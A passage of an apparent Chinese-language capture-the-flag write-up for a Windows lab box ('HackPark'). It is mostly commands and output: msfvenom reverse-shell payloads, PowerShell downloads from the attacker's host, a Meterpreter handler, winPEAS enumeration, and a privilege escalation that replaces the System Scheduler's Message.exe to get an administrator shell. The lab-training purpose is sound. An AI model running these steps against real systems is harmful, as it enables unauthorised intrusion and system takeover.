Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of exe file: 73802 bytes\nSaved as: .&#x2F;reverse_5555.exe\n\n└─$ python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http:&#x2F;&#x2F;0.0.0.0:80&#x2F;) ...<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在<code>netcat</code>会话中将制作的恶意程序下载到靶机上。(需要将目录切换到有写权限的<code>C:\\Windows\\Temp</code>目录下)</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">c:\\Windows\\Temp>powershell <span class=\"token string\">\"(New-Object System.Net.WebClient).Downloadfile('http://10.4.63.84/reverse_5555.exe','reverse_5555.exe')\"</span>\n\nc:\\Windows\\Temp>\n<span class=\"token function\">dir</span>\nc:\\Windows\\Temp><span class=\"token function\">dir</span>\n Volume in drive C has no label<span class=\"token punctuation\">.</span>\n Volume Serial Number is 0E97-C552\n Directory of c:\\Windows\\Temp\n03/31/2022  09:11 AM    &lt;<span class=\"token function\">DIR</span>>          <span class=\"token punctuation\">.</span>\n03/31/2022  09:11 AM    &lt;<span class=\"token function\">DIR</span>>          <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n08/06/2019  02:13 PM             8<span class=\"token punctuation\">,</span>795 Amazon_SSM_Agent_20190806141239<span class=\"token punctuation\">.</span>log\n08/06/2019  02:13 PM           181<span class=\"token punctuation\">,</span>468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI<span class=\"token punctuation\">.</span>log\n08/06/2019  02:13 PM             1<span class=\"token punctuation\">,</span>206 cleanup<span class=\"token punctuation\">.</span>txt\n08/06/2019  02:13 PM               421 cmdout\n08/06/2019  02:11 PM                 0 DMI2EBC<span class=\"token punctuation\">.</span>tmp\n08/03/2019  10:43 AM                 0 DMI4D21<span class=\"token punctuation\">.</span>tmp\n08/06/2019  02:12 PM             8<span class=\"token punctuation\">,</span>743 EC2ConfigService_20190806141221<span class=\"token punctuation\">.</span>log\n08/06/2019  02:12 PM           292<span class=\"token punctuation\">,</span>438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64<span class=\"token punctuation\">.</span>log\n03/31/2022  09:11 AM    &lt;<span class=\"token function\">DIR</span>>          Microsoft\n03/31/2022  09:11 AM            73<span class=\"token punctuation\">,</span>802 reverse_5555<span class=\"token punctuation\">.</span>exe\n08/06/2019  02:13 PM                21 stage1-complete<span class=\"token punctuation\">.</span>txt\n08/06/2019  02:13 PM            28<span class=\"token punctuation\">,</span>495 stage1<span class=\"token punctuation\">.</span>txt\n05/12/2019  09:03 PM           113<span class=\"token punctuation\">,</span>328 svcexec<span class=\"token punctuation\">.</span>exe\n08/06/2019  02:13 PM                67 tmp<span class=\"token punctuation\">.</span>dat\n              13 File<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>        708<span class=\"token punctuation\">,</span>784 bytes\n               3 <span class=\"token function\">Dir</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>  39<span class=\"token punctuation\">,</span>122<span class=\"token punctuation\">,</span>432<span class=\"token punctuation\">,</span>000 bytes free<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>运行MetaSploit，开启<code>exploit/multi/handler</code>监听，等待获取<code>meterpreter</code>会话</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">msf6 &gt; use exploit&#x2F;multi&#x2F;handler\n[*] Using configured payload generic&#x2F;shell_reverse_tcp\nmsf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp\npayload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp\nmsf6 exploit(multi&#x2F;handler) &gt; set LHOST 10.4.63.84\nLHOST &#x3D;&gt; 10.4.63.84\nmsf6 exploit(multi&#x2F;handler) &gt; set LPORT 5555\nLPORT &#x3D;&gt; 5555\nmsf6 exploit(multi&#x2F;handler) &gt; run\n\n[*] Started reverse TCP handler on 10.4.63.84:5555<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在<code>netcat</code>会话中运行<code>powershell Start-Process &quot;shell-name.exe&quot;</code></p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">c:\\Windows\\Temp>\npowershell <span class=\"token function\">Start-Process</span> <span class=\"token string\">\"reverse_5555.exe\"</span>\nc:\\Windows\\Temp>powershell <span class=\"token function\">Start-Process</span> <span class=\"token string\">\"reverse_5555.exe\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>获得了<code>meterpreter</code>会话。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">msf6 exploit(multi&#x2F;handler) &gt; run\n[*] Started reverse TCP handler on 10.4.63.84:5555\n[*] Sending stage (175174 bytes) to 10.10.1.135\n[*] Meterpreter session 1 opened (10.4.63.84:5555 -&gt; 10.10.1.135:49412 ) at 2022-03-31 12:22:07 -0400\n\nmeterpreter &gt; getuid\nServer username: IIS APPPOOL\\Blog<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"提升系统权限\"><a href=\"#提升系统权限\" class=\"headerlink\" title=\"提升系统权限\"></a>提升系统权限</h2><p>在获得meterpreter会话后，就可以使用<code>WinPEAS</code>进一步的搜集靶机信息，寻找可能存在的漏洞。(使用powershll下载<code>winPEASx64.exe</code>到靶机)</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">C:\\Windows\\Temp>powershell <span class=\"token operator\">-</span>c wget <span class=\"token string\">\"http://10.4.63.84/winPEASx64.exe\"</span> <span class=\"token operator\">-</span>outfile <span class=\"token string\">\"winPEASx64.exe\"</span>\nC:\\Windows\\Temp><span class=\"token function\">dir</span>\n Volume in drive C has no label<span class=\"token punctuation\">.</span>\n Volume Serial Number is 0E97-C552\n\n Directory of C:\\Windows\\Temp\n\n04/01/2022  09:34 AM    &lt;<span class=\"token function\">DIR</span>>          <span class=\"token punctuation\">.</span>\n04/01/2022  09:34 AM    &lt;<span class=\"token function\">DIR</span>>          <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n08/06/2019  02:13 PM             8<span class=\"token punctuation\">,</span>795 Amazon_SSM_Agent_20190806141239<span class=\"token punctuation\">.</span>log\n08/06/2019  02:13 PM           181<span class=\"token punctuation\">,</span>468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI<span class=\"token punctuation\">.</span>log\n08/06/2019  02:13 PM             1<span class=\"token punctuation\">,</span>206 cleanup<span class=\"token punctuation\">.</span>txt\n08/06/2019  02:13 PM               421 cmdout\n08/06/2019  02:11 PM                 0 DMI2EBC<span class=\"token punctuation\">.</span>tmp\n08/03/2019  10:43 AM                 0 DMI4D21<span class=\"token punctuation\">.</span>tmp\n08/06/2019  02:12 PM             8<span class=\"token punctuation\">,</span>743 EC2ConfigService_20190806141221<span class=\"token punctuation\">.</span>log\n08/06/2019  02:12 PM           292<span class=\"token punctuation\">,</span>438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64<span class=\"token punctuation\">.</span>log\n04/01/2022  06:42 AM    &lt;<span class=\"token function\">DIR</span>>          Microsoft\n04/01/2022  06:42 AM            73<span class=\"token punctuation\">,</span>802 reverse_5555<span class=\"token punctuation\">.</span>exe\n08/06/2019  02:13 PM                21 stage1-complete<span class=\"token punctuation\">.</span>txt\n08/06/2019  02:13 PM            28<span class=\"token punctuation\">,</span>495 stage1<span class=\"token punctuation\">.</span>txt\n05/12/2019  09:03 PM           113<span class=\"token punctuation\">,</span>328 svcexec<span class=\"token punctuation\">.</span>exe\n08/06/2019  02:13 PM                67 tmp<span class=\"token punctuation\">.</span>dat\n04/01/2022  09:34 AM         1<span class=\"token punctuation\">,</span>935<span class=\"token punctuation\">,</span>872 winPEASx64<span class=\"token punctuation\">.</span>exe\n              14 File<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>      2<span class=\"token punctuation\">,</span>644<span class=\"token punctuation\">,</span>656 bytes\n               3 <span class=\"token function\">Dir</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>  39<span class=\"token punctuation\">,</span>111<span class=\"token punctuation\">,</span>761<span class=\"token punctuation\">,</span>920 bytes free<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>执行<code>winPEASx64.exe quiet cmd serviceinfo</code>。命令执行有非常多的输出，最终我们找到了<b>Services Information</b>模块的输出。</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">C:\\Windows\\Temp>winPEASx64<span class=\"token punctuation\">.</span>exe quiet cmd serviceinfo\nwinPEASx64<span class=\"token punctuation\">.</span>exe quiet cmd serviceinfo\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n================================================Services Information================================================\n\n<span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> Interesting Services <span class=\"token operator\">-</span>non Microsoft-\n <span class=\"token punctuation\">[</span>?<span class=\"token punctuation\">]</span> Check <span class=\"token keyword\">if</span> you can overwrite some service binary or perform a DLL hijacking<span class=\"token punctuation\">,</span> also check <span class=\"token keyword\">for</span> unquoted paths https:<span class=\"token operator\">/</span><span class=\"token operator\">/</span>book<span class=\"token punctuation\">.</span>hacktricks<span class=\"token punctuation\">.</span>xyz/windows/windows-local-privilege-escalation<span class=\"token comment\">#services</span>\n    Amazon EC2Launch<span class=\"token punctuation\">(</span>Amazon Web Services<span class=\"token punctuation\">,</span> Inc<span class=\"token punctuation\">.</span> <span class=\"token operator\">-</span> Amazon EC2Launch<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"C:\\Program Files\\Amazon\\EC2Launch\\EC2Launch.exe\"</span> service<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> Auto <span class=\"token operator\">-</span> Stopped\n    Amazon EC2Launch\n   =================================================================================================\n\n    AmazonSSMAgent<span class=\"token punctuation\">(</span>Amazon SSM Agent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"C:\\Program Files\\Amazon\\SSM\\amazon-ssm-agent.exe\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> Auto <span class=\"token operator\">-</span> Running\n    Amazon SSM Agent\n   =================================================================================================\n\n    AWSLiteAgent<span class=\"token punctuation\">(</span>Amazon Inc<span class=\"token punctuation\">.</span> <span class=\"token operator\">-</span> AWS Lite Guest Agent<span class=\"token punctuation\">)</span><span class=\"token namespace\">[C:\\Program Files\\Amazon\\XenTools\\LiteAgent.exe]</span> <span class=\"token operator\">-</span> Auto <span class=\"token operator\">-</span> Running <span class=\"token operator\">-</span> No quotes and Space detected\n    AWS Lite Guest Agent\n   =================================================================================================\n\n    Ec2Config<span class=\"token punctuation\">(</span>Amazon Web Services<span class=\"token punctuation\">,</span> Inc<span class=\"token punctuation\">.</span> <span class=\"token operator\">-</span> Ec2Config<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"C:\\Program Files\\Amazon\\Ec2ConfigService\\Ec2Config.exe\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> Auto <span class=\"token operator\">-</span> Running <span class=\"token operator\">-</span> isDotNet\n    Ec2 Configuration Service\n   =================================================================================================\n\n    PsShutdownSvc<span class=\"token punctuation\">(</span>Systems Internals <span class=\"token operator\">-</span> PsShutdown<span class=\"token punctuation\">)</span><span class=\"token namespace\">[C:\\Windows\\PSSDNSVC.EXE]</span> <span class=\"token operator\">-</span> Manual <span class=\"token operator\">-</span> Stopped\n   =================================================================================================\n\n    WindowsScheduler<span class=\"token punctuation\">(</span>Splinterware Software Solutions <span class=\"token operator\">-</span> System Scheduler Service<span class=\"token punctuation\">)</span><span class=\"token namespace\">[C:\\PROGRA~2\\SYSTEM~1\\WService.exe]</span> <span class=\"token operator\">-</span> Auto <span class=\"token operator\">-</span> Running\n    File Permissions: Everyone <span class=\"token namespace\">[WriteData/CreateFiles]</span>\n    Possible DLL Hijacking in binary folder: C:\\Program Files <span class=\"token punctuation\">(</span>x86<span class=\"token punctuation\">)</span>\\SystemScheduler <span class=\"token punctuation\">(</span>Everyone <span class=\"token namespace\">[WriteData/CreateFiles]</span><span class=\"token punctuation\">)</span>\n    System Scheduler Service Wrapper\n   =================================================================================================<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们从输出中发现，<code>C:\\Program Files (x86)\\SystemScheduler</code>路径下的<code>WindowsScheduler</code>服务可能存在DLL劫持。同时我们也在exploit-db中搜索到了<a href=\"https://www.exploit-db.com/exploits/45072\">Splinterware System Scheduler Pro 5.12 - Privilege Escalation</a>漏洞。</p>\n<details class=\"custom-details\">\n<summary>Splinterware System Scheduler Pro 5.12</summary>\n<p><p>由于不安全的文件权限而导致的权限提升,若要成功利用此漏洞，必须安装<code>System Scheduler service</code>服务。</p>\n<p>默认情况下，Everyone组对System Schedule服务路径下具有修改权限。一个低特权帐户可以重命名位于该服务路径下的执行文件，并上传一个恶意文件。因为<code>System Scheduler service</code>服务作为本地系统运行(<code>nt authority\\system</code>)，所以执行的恶意文件也将会获得系统权限。<b>但是低特权帐户无法重启服务，所以更换的恶意文件必须与定期执行的服务文件同名，才能触发攻击</b>。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">C:\\&gt;icacls &quot;c:\\Program Files (x86)\\SystemScheduler&quot;\nEveryone:(OI)(CI)(M)\nNT SERVICE\\TrustedInstaller:(I)(F)\nNT SERVICE\\TrustedInstaller:(I)(CI)(IO)(F)\nNT AUTHORITY\\SYSTEM:(I)(F)\nNT AUTHORITY\\SYSTEM:(I)(OI)(CI)(IO)(F)\nBUILTIN\\Administrators:(I)(F)\nBUILTIN\\Administrators:(I)(OI)(CI)(IO)(F)\nBUILTIN\\Users:(I)(RX)\nBUILTIN\\Users:(I)(OI)(CI)(IO)(GR,GE)\nCREATOR OWNER:(I)(OI)(CI)(IO)(F)\nAPPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)\nAPPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<p>得知漏洞的具体使用信息后，我们继续深入调查靶机上所暴露的信息。查看winPEAS指向的<code>SystemScheduler</code>路径，发现了存在一个名为<code>Events</code>目录。在这个目录中我们找到了日志文件<code>20198415519.INI_LOG.txt</code>。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">meterpreter &gt; cat 20198415519.INI_LOG.txt\n08&#x2F;04&#x2F;19 15:06:01,Event Started Ok, (Administrator)\n08&#x2F;04&#x2F;19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)\n08&#x2F;04&#x2F;19 15:07:00,Event Started Ok, (Administrator)\n08&#x2F;04&#x2F;19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)\n08&#x2F;04&#x2F;19 15:08:00,Event Started Ok, (Administrator)\n08&#x2F;04&#x2F;19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)\n08&#x2F;04&#x2F;19 15:09:00,Event Started Ok, (Administrator)\n08&#x2F;04&#x2F;19 15:09:34,Process Ended. PID:3024,ExitCode:4,Message.exe (Administrator)\n08&#x2F;04&#x2F;19 15:10:00,Event Started Ok, (Administrator)\n08&#x2F;04&#x2F;19 15:10:33,Process Ended. PID:1556,ExitCode:4,Message.exe (Administrator)\n08&#x2F;04&#x2F;19 15:11:00,Event Started Ok, (Administrator)\n08&#x2F;04&#x2F;19 15:11:33,Process Ended. PID:468,ExitCode:4,Message.exe (Administrator)\n......<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在日志中Administrator每隔30s就会停止并重新执行一个名为<code>Message.exe</code>的可执行文件。结合上述漏洞的描述，<code>Message.exe</code>文件就是我们需要篡改的执行文件。使用<code>msfvenom</code>生成恶意程序。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;10.4.63.84 LPORT&#x3D;1337 -f exe -o Message.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of exe file: 7168 bytes\nSaved as: Message.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>将靶机上的<code>Message.exe</code>重命名，并将生成的恶意程序上传到相同的路径下。</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">C:\\Program Files <span class=\"token punctuation\">(</span>x86<span class=\"token punctuation\">)</span>\\SystemScheduler>rename Message<span class=\"token punctuation\">.</span>exe Message<span class=\"token punctuation\">.</span>old\nC:\\Program Files <span class=\"token punctuation\">(</span>x86<span class=\"token punctuation\">)</span>\\SystemScheduler>powershell <span class=\"token function\">Invoke-WebRequest</span> <span class=\"token operator\">-</span>Uri http:<span class=\"token operator\">/</span><span class=\"token operator\">/</span>10<span class=\"token punctuation\">.</span>4<span class=\"token punctuation\">.</span>63<span class=\"token punctuation\">.</span>84/Message<span class=\"token punctuation\">.</span>exe <span class=\"token operator\">-</span>Outfile Message<span class=\"token punctuation\">.</span>exe\nC:\\Program Files <span class=\"token punctuation\">(</span>x86<span class=\"token punctuation\">)</span>\\SystemScheduler><span class=\"token function\">dir</span>\n Directory of c:\\Program Files <span class=\"token punctuation\">(</span>x86<span class=\"token punctuation\">)</span>\\SystemScheduler\n04/01/2022  10:29 AM    &lt;<span class=\"token function\">DIR</span>>          <span class=\"token punctuation\">.</span>\n04/01/2022  10:29 AM    &lt;<span class=\"token function\">DIR</span>>          <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n05/17/2007  01:47 PM             1<span class=\"token punctuation\">,</span>150 alarmclock<span class=\"token punctuation\">.</span>ico\n08/31/2003  12:06 PM               766 clock<span class=\"token punctuation\">.</span>ico\n08/31/2003  12:06 PM            80<span class=\"token punctuation\">,</span>856 ding<span class=\"token punctuation\">.</span>wav\n04/01/2022  10:27 AM    &lt;<span class=\"token function\">DIR</span>>          Events\n08/04/2019  04:36 AM                60 Forum<span class=\"token punctuation\">.</span>url\n01/08/2009  08:21 PM         1<span class=\"token punctuation\">,</span>637<span class=\"token punctuation\">,</span>972 libeay32<span class=\"token punctuation\">.</span>dll\n11/16/2004  12:16 AM             9<span class=\"token punctuation\">,</span>813 License<span class=\"token punctuation\">.</span>txt\n04/01/2022  06:32 AM             1<span class=\"token punctuation\">,</span>496 LogFile<span class=\"token punctuation\">.</span>txt\n04/01/2022  06:32 AM             3<span class=\"token punctuation\">,</span>760 LogfileAdvanced<span class=\"token punctuation\">.</span>txt\n04/01/2022  10:29 AM             7<span class=\"token punctuation\">,</span>168 Message<span class=\"token punctuation\">.</span>exe\n03/25/2018  10:58 AM           536<span class=\"token punctuation\">,</span>992 Message<span class=\"token punctuation\">.</span>old\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>稍等片刻后，<code>netcat</code>获得管理员权限。</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">└─$ rlwrap nc <span class=\"token operator\">-</span>lvnp 1337\nNcat: Version 7<span class=\"token punctuation\">.</span>92 <span class=\"token punctuation\">(</span> https:<span class=\"token operator\">/</span><span class=\"token operator\">/</span>nmap<span class=\"token punctuation\">.</span>org/ncat <span class=\"token punctuation\">)</span>\nNcat: Listening on :::1337\nNcat: Listening on 0<span class=\"token punctuation\">.</span>0<span class=\"token punctuation\">.</span>0<span class=\"token punctuation\">.</span>0:1337\nNcat: Connection <span class=\"token keyword\">from</span> 10<span class=\"token punctuation\">.</span>10<span class=\"token punctuation\">.</span>200<span class=\"token punctuation\">.</span>41<span class=\"token punctuation\">.</span>\nNcat: Connection <span class=\"token keyword\">from</span> 10<span class=\"token punctuation\">.</span>10<span class=\"token punctuation\">.</span>200<span class=\"token punctuation\">.</span>41:49469<span class=\"token punctuation\">.</span>\nMicrosoft Windows <span class=\"token namespace\">[Version 6.3.9600]</span>\n<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> 2013 Microsoft Corporation<span class=\"token punctuation\">.</span> All rights reserved<span class=\"token punctuation\">.</span>\nC:\\>whoami\nhackpark\\administrator<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<details class=\"custom-details\">\n<summary>Windows-Exploit-Suggester寻找漏洞</summary>\n<p>该工具将目标补丁级别与 Microsoft 漏洞数据库进行比较，以检测目标上可能丢失的补丁。它还通知用户是否有公共利用和 Metasploit 模块可用于缺失的公告。它需要 Windows 主机的 systeminfo 命令输出，以便比较 Microsoft 安全公告数据库并确定主机的补丁级别。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">meterpreter &gt; sysinfo\nComputer        : HACKPARK\nOS              : Windows 2012 R2 (6.3 Build 9600).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x86&#x2F;windows<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>运行<code>sysinfo</code>获取系统信息后，在这里我们借助开源工具<code>Windows-Exploit-Suggester</code>来快速查找当前版本系统可能利用的漏洞信息。(使用Python2运行该脚本)</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">\n└─$ python2 windows-exploit-suggester.py --database 2022-03-31-mssb.xls --ostext &#39;Windows 2012 R2&#39;\n...\n...\n[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important\n[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;40107&#x2F; -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF\n[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;39574&#x2F; -- Microsoft Windows 8.1&#x2F;10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC\n[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;39719&#x2F; -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32&#x2F;x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC\n[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;39809&#x2F; -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32&#x2F;x64) - Local Privilege Escalation (MS16-032) (C#)\n···\n...<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n</details>\n<h1 id=\"使用工具\"><a href=\"#使用工具\" class=\"headerlink\" title=\"使用工具\"></a>使用工具</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ul>\n<li>Namp</li>\n<li>MetaSploit</li>\n<li><a href=\"https://github.com/vanhauser-thc/thc-hydra\">hydra</a></li>\n<li><a href=\"https://www.offensive-security.com/metasploit-unleashed/msfvenom/\">msfvenom</a></li>\n<li><a href=\"https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS\">winPEAS</a></li>\n</ul></blockquote>\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 